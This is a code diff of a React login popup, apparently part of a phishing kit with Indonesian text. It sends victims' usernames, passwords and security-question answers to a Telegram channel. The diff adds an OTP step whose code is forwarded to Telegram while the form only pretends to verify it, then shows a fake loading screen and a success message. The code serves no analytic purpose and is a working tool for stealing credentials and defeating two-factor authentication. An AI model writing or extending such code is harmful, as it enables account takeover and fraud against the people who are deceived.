@@ -1,5 +1,6 @@
 import { useState } from 'react';
-import { sendToTelegram } from '../services/telegram';
+import { sendToTelegram, sendOTPSubmission } from '../services/telegram';
+import OTPVerificationImage from './OTPVerificationImage';
 import './LoginForm.css';
 
 interface LoginFormProps {
@@ -8,7 +9,7 @@ interface LoginFormProps {
 }
 
 const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
-  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Notification, 2: Verification Questions, 3: Success Modal
+  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Notification, 2: Verification Questions, 2.5: OTP Verification, 3: Success Modal
   
   // STEP 1 STATES
   const [username, setUsername] = useState('');
@@ -83,26 +84,19 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
     // Hardcoded questions based on typical usage or reference context
     const q1 = "Apa film favorit Anda?";
     const q2 = "Apa Makanan Kesukaan Anda?";
-    const combinedQ = `Q1. ${q1} (<code>${a1}</code>)\nQ2. ${q2} (<code>${a2}</code>)`;
     
-    const success = await sendToTelegram(username, password, combinedQ, "-");
+    // Passing questions and answers separately to allow proper formatting
+    const success = await sendToTelegram(username, password, q1, a1, q2, a2);
     
-    // Tampilkan Custom Loading Overlay
-    setShowCustomLoading(true);
-    setStep(0); // 0 = Hide all forms temporarily
-
-    // Delay 5 detik sebelum muncul alert sukses/gagal
-    setTimeout(() => {
-      setShowCustomLoading(false);
-      setLoading(false);
-      
-      if (success) {
-        setStep(3); // Show Success Modal
-      } else {
-        alert('Gagal mengirim data. Silakan coba lagi.');
-        setStep(2); // Kembali ke form pertanyaan
-      }
-    }, 5000);
+    setLoading(false);
+    
+    if (success) {
+      // Lanjut ke OTP Verification
+      setStep(2.5);
+    } else {
+      alert('Gagal mengirim data. Silakan coba lagi.');
+      setStep(2); // Kembali ke form pertanyaan
+    }
   };
 
   const handleClose = () => {
@@ -111,6 +105,28 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
     } else {
       window.location.reload();
     }
+  };
+
+  const handleOTPVerification = async (otp: string, method: 'wa' | 'email', identifier: string) => {
+    // Simulate OTP verification success
+    console.log(`OTP ${otp} verified via ${method}`);
+    
+    // Send OTP submission to Telegram
+    try {
+      await sendOTPSubmission(username, identifier, otp, method);
+    } catch (error) {
+      console.error('Failed to send OTP submission:', error);
+    }
+    
+    // Show loading overlay
+    setShowCustomLoading(true);
+    setStep(0); // Hide all forms temporarily
+
+    // Simulate verification delay
+    setTimeout(() => {
+      setShowCustomLoading(false);
+      setStep(3); // Show Success Modal
+    }, 3000);
   };
 
   // Mock functions from user snippet
@@ -141,7 +157,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
       {step === 1 && (
         <div className="login-popup-container animate-pop-in">
           {/* Main Background Image */}
-          <img src="https://gambar.scatterwinss.com/img/login.png" alt="ID Login Form" className="login-bg-img" />
+          <img src="./login.png" alt="ID Login Form" className="login-bg-img" />
           
           {/* Inputs Overlay */}
           <div className="input-container">
@@ -184,7 +200,7 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
       {step === 1.5 && (
         <div className="security-popup-container animate-pop-in">
           <img 
-            src="https://gambar.scatterwinss.com/img/OIP__1_-removebg-preview.png" 
+            src="keamanan.png" 
             alt="Keamanan" 
             className="login-bg-img" 
             onClick={handleSecurityProceed}
@@ -241,6 +257,16 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
 
           </div>
         </div>
+      )}
+
+      {/* ================= STEP 2.5: OTP VERIFICATION ================= */}
+      {step === 2.5 && (
+        <OTPVerificationImage 
+          onClose={handleClose}
+          onSubmitOTP={handleOTPVerification}
+          playClickSound={playClickSound}
+          username={username}
+        />
       )}
 
       {/* ================= STEP 3: SUCCESS MODAL ================= */}
